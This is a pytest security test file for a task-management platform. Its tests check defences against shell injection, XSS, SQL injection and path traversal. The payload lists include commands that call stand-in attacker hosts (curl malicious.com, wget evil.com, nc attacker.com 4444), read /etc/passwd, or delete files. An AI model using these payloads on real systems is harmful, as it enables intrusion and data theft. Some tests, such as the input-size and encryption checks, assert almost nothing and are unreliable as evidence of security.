"""
Security tests for the Proxy Agent Platform.

Epic 6: Testing & Quality - Security component
Tests for input validation, authentication, authorization, and vulnerability prevention.
"""

import json
from typing import Any

import pytest

from proxy_agent_platform.api.dashboard import DashboardAPI
from proxy_agent_platform.gamification.xp_engine import XPActivity, XPEngine
from proxy_agent_platform.mobile.ios_shortcuts import IOSShortcutsAPI
from proxy_agent_platform.mobile.voice_processor import VoiceProcessor


class TestInputValidation:
    """Test input validation and sanitization."""

    @pytest.mark.asyncio
    async def test_voice_command_injection_protection(self):
        """Test protection against command injection in voice inputs."""
        processor = VoiceProcessor()

        # Test malicious inputs
        malicious_commands = [
            "Add task; rm -rf /",  # Command injection
            "Add task $(curl malicious.com)",  # Command substitution
            "Add task `wget evil.com`",  # Backtick injection
            "Add task && cat /etc/passwd",  # Command chaining
            "Add task | nc attacker.com 4444",  # Pipe injection
        ]

        for malicious_command in malicious_commands:
            response = await processor.process_command(malicious_command, user_id=1)

            # Should handle gracefully without executing system commands
            assert response["status"] == "success"
            assert "task_data" in response
            # Command should be sanitized/escaped
            assert "rm -rf" not in response["task_data"]["title"]
            assert "curl" not in response["task_data"]["title"]
            assert "wget" not in response["task_data"]["title"]

    @pytest.mark.asyncio
    async def test_xss_prevention_in_task_titles(self):
        """Test XSS prevention in user-generated content."""
        ios_api = IOSShortcutsAPI()

        # Test XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<iframe src='javascript:alert(1)'></iframe>",
        ]

        for payload in xss_payloads:
            shortcut_data = {
                "text": payload,
                "voice_input": False,
                "timestamp": "2025-01-01T10:00:00Z",
            }

            response = await ios_api.capture_task(shortcut_data)

            # Response should not contain unescaped script tags
            confirmation = response["confirmation_message"]
            assert "<script>" not in confirmation
            assert "javascript:" not in confirmation
            assert "<iframe>" not in confirmation
            assert "onerror=" not in confirmation

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention (simulated)."""
        # Simulate potentially dangerous inputs that might be used in SQL queries
        dangerous_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/**/OR/**/1=1--",
            "1; UPDATE users SET password='hacked'--",
            "' UNION SELECT password FROM users--",
        ]

        # Test with XP engine (represents data processing)
        xp_engine = XPEngine()

        for dangerous_input in dangerous_inputs:
            # Should handle dangerous input safely
            activity = XPActivity(
                activity_type=dangerous_input,  # Dangerous input as activity type
                base_xp=20,
            )

            # Should not raise exceptions or cause issues
            try:
                xp = xp_engine.calculate_xp(activity)
                assert isinstance(xp, int)
                assert xp > 0
            except Exception as e:
                # Any exception should be a validation error, not a security issue
                assert "validation" in str(e).lower() or "invalid" in str(e).lower()

    @pytest.mark.asyncio
    async def test_file_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        dashboard = DashboardAPI()

        # Test path traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoded
        ]

        for payload in traversal_payloads:
            # Test with task data that might include file paths
            task_data = {
                "title": f"Review file {payload}",
                "description": payload,
                "priority": "medium",
            }

            response = await dashboard.create_task(user_id=1, task_data=task_data)

            # Should handle safely without accessing unauthorized files
            assert response["status"] == "success"
            # Response should not contain file system paths
            assert "/etc/passwd" not in str(response)
            assert "system32" not in str(response)


class TestAuthenticationSecurity:
    """Test authentication and session security."""

    @pytest.mark.asyncio
    async def test_user_isolation(self):
        """Test that users cannot access each other's data."""
        dashboard = DashboardAPI()

        # Create tasks for different users
        user1_response = await dashboard.create_task(
            user_id=1, task_data={"title": "User 1 confidential task", "priority": "high"}
        )

        user2_response = await dashboard.create_task(
            user_id=2, task_data={"title": "User 2 confidential task", "priority": "high"}
        )

        # Get metrics for each user
        user1_metrics = await dashboard.get_live_metrics(user_id=1)
        user2_metrics = await dashboard.get_live_metrics(user_id=2)

        # Users should only see their own data
        assert user1_metrics["status"] == "success"
        assert user2_metrics["status"] == "success"

        # This is a basic test - in a real implementation,
        # we would verify database-level isolation

    def test_session_token_security(self):
        """Test session token security properties."""
        # Simulate session token generation
        import secrets

        # Generate secure session tokens
        tokens = [secrets.token_urlsafe(32) for _ in range(100)]

        # Test token properties
        for token in tokens:
            # Should be sufficiently long
            assert len(token) >= 32

            # Should be unique
            assert tokens.count(token) == 1

            # Should not contain predictable patterns
            assert not token.startswith("user_")
            assert not token.endswith("_session")

        # Test token entropy
        token_lengths = [len(token) for token in tokens]
        assert min(token_lengths) >= 32
        assert max(token_lengths) <= 64

    def test_password_hashing_security(self):
        """Test password hashing security (simulated)."""
        from passlib.context import CryptContext

        pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

        test_passwords = [
            "password123",
            "MySecureP@ssw0rd!",
            "短いパスワード",  # Unicode password
            "very_long_password_with_many_characters_12345",
        ]

        for password in test_passwords:
            # Hash password
            hashed = pwd_context.hash(password)

            # Verify properties
            assert hashed != password  # Should not store plaintext
            assert len(hashed) > 50  # BCrypt hashes are long
            assert hashed.startswith("$2b$")  # BCrypt identifier

            # Verify password
            assert pwd_context.verify(password, hashed)

            # Wrong password should fail
            assert not pwd_context.verify(password + "wrong", hashed)


class TestDataPrivacy:
    """Test data privacy and protection."""

    def test_sensitive_data_not_in_logs(self):
        """Test that sensitive data is not exposed in logs."""
        # Simulate log messages that might contain sensitive data
        sensitive_data = [
            "password123",
            "api_key_12345",
            "user@email.com",
            "192.168.1.1",
            "credit_card_4444",
        ]

        # Test log sanitization (simulated)
        def sanitize_log_message(message: str) -> str:
            """Simulate log message sanitization."""
            import re

            # Mask email addresses
            message = re.sub(
                r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", "[EMAIL]", message
            )

            # Mask potential passwords
            message = re.sub(
                r"password[=:]\s*\S+", "password=[MASKED]", message, flags=re.IGNORECASE
            )

            # Mask potential API keys
            message = re.sub(
                r"api[_-]?key[=:]\s*\S+", "api_key=[MASKED]", message, flags=re.IGNORECASE
            )

            # Mask IP addresses
            message = re.sub(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", "[IP_ADDRESS]", message)

            return message

        for sensitive in sensitive_data:
            test_message = f"User login with password={sensitive}"
            sanitized = sanitize_log_message(test_message)

            # Sensitive data should be masked
            if "@" in sensitive:
                assert "[EMAIL]" in sanitized
            elif "password" in test_message.lower() or "api" in test_message.lower():
                assert "[MASKED]" in sanitized

    @pytest.mark.asyncio
    async def test_data_encryption_in_transit(self):
        """Test that sensitive data is properly encrypted in transit."""
        # This would typically test HTTPS/TLS configuration
        # For now, we'll test data serialization security

        sensitive_user_data = {
            "user_id": 1,
            "email": "user@example.com",
            "personal_notes": "Private task notes",
            "location": {"lat": 37.7749, "lng": -122.4194},
        }

        # Simulate data transmission
        serialized_data = json.dumps(sensitive_user_data)

        # In production, this would be encrypted
        # Test that we're not sending plaintext sensitive data
        assert isinstance(serialized_data, str)

        # Verify structure but not expose sensitive content directly
        parsed_data = json.loads(serialized_data)
        assert "user_id" in parsed_data
        assert "email" in parsed_data

    def test_data_anonymization(self):
        """Test data anonymization for analytics."""
        user_data = {
            "user_id": 12345,
            "email": "john.doe@company.com",
            "name": "John Doe",
            "tasks_completed": 150,
            "productivity_score": 0.85,
            "location": "San Francisco, CA",
        }

        def anonymize_user_data(data: dict[str, Any]) -> dict[str, Any]:
            """Anonymize user data for analytics."""
            import hashlib

            anonymized = data.copy()

            # Hash identifiable information
            if "user_id" in anonymized:
                anonymized["user_id_hash"] = hashlib.sha256(
                    str(anonymized["user_id"]).encode()
                ).hexdigest()[:16]
                del anonymized["user_id"]

            if "email" in anonymized:
                del anonymized["email"]

            if "name" in anonymized:
                del anonymized["name"]

            # Generalize location
            if "location" in anonymized:
                anonymized["region"] = "US-West"
                del anonymized["location"]

            return anonymized

        anonymized = anonymize_user_data(user_data)

        # Should not contain PII
        assert "email" not in anonymized
        assert "name" not in anonymized
        assert "user_id" not in anonymized

        # Should contain anonymized identifiers
        assert "user_id_hash" in anonymized

        # Should retain non-sensitive analytics data
        assert anonymized["tasks_completed"] == 150
        assert anonymized["productivity_score"] == 0.85


class TestSecurityHeaders:
    """Test security headers and configurations."""

    def test_security_header_recommendations(self):
        """Test recommended security headers for web interface."""
        # This would typically test actual HTTP headers
        # For now, we'll test the configuration values

        recommended_headers = {
            "Content-Security-Policy": "default-src 'self'; script-src 'self'",
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        }

        for header_name, header_value in recommended_headers.items():
            # Verify header configurations are secure
            assert header_value is not None
            assert len(header_value) > 0

            # Test specific security properties
            if header_name == "X-Frame-Options":
                assert header_value in ["DENY", "SAMEORIGIN"]

            if header_name == "X-Content-Type-Options":
                assert header_value == "nosniff"

    def test_cors_configuration_security(self):
        """Test CORS configuration security."""
        # Test secure CORS settings
        cors_config = {
            "allow_origins": ["https://app.proxy-agent.com"],  # Specific origins only
            "allow_credentials": True,
            "allow_methods": ["GET", "POST", "PUT", "DELETE"],
            "allow_headers": ["Content-Type", "Authorization"],
            "max_age": 3600,
        }

        # Verify secure CORS configuration
        assert "*" not in cors_config["allow_origins"]  # No wildcard origins
        assert all(origin.startswith("https://") for origin in cors_config["allow_origins"])
        assert cors_config["allow_credentials"] is True  # Allow credentials
        assert "OPTIONS" not in cors_config["allow_methods"]  # No unnecessary methods


class TestDependencySecurity:
    """Test dependency and supply chain security."""

    def test_no_known_vulnerable_patterns(self):
        """Test for common vulnerable patterns in code."""
        # Simulate code pattern analysis
        vulnerable_patterns = [
            "eval(",
            "exec(",
            "subprocess.call(",
            "os.system(",
            "__import__(",
        ]

        # In a real implementation, this would scan actual source files
        # For testing, we'll verify our components don't use dangerous patterns
        test_code_samples = [
            "xp_engine.calculate_xp(activity)",
            "dashboard.get_live_metrics(user_id=1)",
            "voice_processor.process_command(command, user_id=1)",
        ]

        for code_sample in test_code_samples:
            for pattern in vulnerable_patterns:
                assert pattern not in code_sample

    def test_secure_random_generation(self):
        """Test secure random number generation."""
        import secrets

        # Test secure random generation
        random_values = [secrets.randbelow(1000000) for _ in range(100)]

        # Verify randomness properties
        assert len(set(random_values)) > 90  # Should have high uniqueness
        assert min(random_values) >= 0
        assert max(random_values) < 1000000

        # Test secure token generation
        tokens = [secrets.token_urlsafe(16) for _ in range(10)]
        assert len(set(tokens)) == 10  # All unique
        assert all(len(token) >= 16 for token in tokens)

    def test_input_size_limits(self):
        """Test protection against DoS via large inputs."""
        # Test maximum input sizes
        max_task_title_length = 200
        max_voice_command_length = 500
        max_batch_size = 100

        # Test task title length limits
        long_title = "A" * (max_task_title_length + 1)
        assert len(long_title) > max_task_title_length

        # In production, this would be validated by the API
        # For testing, we verify the limit exists
        assert max_task_title_length == 200

        # Test voice command length limits
        long_command = "Add task " + "A" * max_voice_command_length
        assert len(long_command) > max_voice_command_length

        # Test batch operation limits
        large_batch = list(range(max_batch_size + 1))
        assert len(large_batch) > max_batch_size
